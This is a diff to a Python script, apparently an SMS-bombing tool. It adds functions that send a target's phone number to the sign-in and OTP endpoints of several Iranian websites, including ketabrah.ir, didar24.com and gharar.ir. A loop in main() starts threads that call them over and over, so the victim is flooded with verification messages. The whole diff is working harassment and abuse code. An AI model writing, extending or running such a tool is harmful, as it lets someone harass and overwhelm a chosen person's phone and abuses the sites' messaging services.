@@ -369,8 +369,28 @@ def takshopaccessorise(phone):
     headers = {'content-type': 'application/json;charset=UTF-8'}
     response = requests.post(url, data=phone_value, headers=headers)
     print(response.text)
-    
-    
+ 
+def ketabrah(phone):
+    url = 'https://www.ketabrah.ir/users/signin'
+    phone_value = '{"ucSignin$email":"' + phone + '","__VIEWSTATE":"2ULXsxwJ8fuB3M48o0IM8OA3l20okHKKKW18255j+4NNGRaM9YR4z5fNId0siOn0Xs19HJpadiI66E6ziBxHYXaRyhq5Ts6CUZ9S5gGi5VzxnZHQ","__VIEWSTATEGENERATOR":"4031B7D4","__EVENTVALIDATION":"72FvNyIEYIwGuQeW5UZ9BzlvR90uVB4ggXB2a6EafZnWSLqfhi5dIiPg0vT1KNwPkvwU76XeIRs2t0Ayw/cYjbon+6o72L3VqAOY+sMD5ec5eievgPi/idMmYbLnH2iXr7NQ9g==","ucSignin$btnSigninOrSignup":"ورود+به+کتابراه"}'
+    headers = {'content-type': 'application/json;charset=UTF-8'}
+    response = requests.post(url, data=phone_value, headers=headers)
+    print(response.text)
+
+def didar(phone):
+    url = 'https://didar24.com/api/AccessManagement/OAuth/mobile'
+    phone_value = "-----------------------------192935136217957986722098052833\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n" + phone + "\r\n-----------------------------192935136217957986722098052833--\r\n"
+    headers = {'content-type': 'multipart/form-data; boundary=---------------------------192935136217957986722098052833'}
+    response = requests.post(url, data=phone_value, headers=headers)
+    print(response.text)  # or do something else with the response
+     
+def gharar(phone):
+    url = 'https://gharar.ir/users/phone_number/'
+    phone_value = '{"phone":"' + phone + '"}'
+    headers = {'content-type': 'application/json'}
+    response = requests.post(url, data=phone_value, headers=headers)
+    print(response.text)  # or do something else with the response
+
 def main():
     phone = str(input("Made by baji inter phone number (+98xxxxxxx): "))
     while True:
@@ -402,6 +422,9 @@ def main():
         Thread(target=drnext, args=[phone]).start()
         Thread(target=classino, args=[phone]).start()
         Thread(target=takshopaccessorise, args=[phone]).start()
+        Thread(target=didar, args=[phone]).start()
+        Thread(target=gharar, args=[phone]).start()
+        
 
 
 
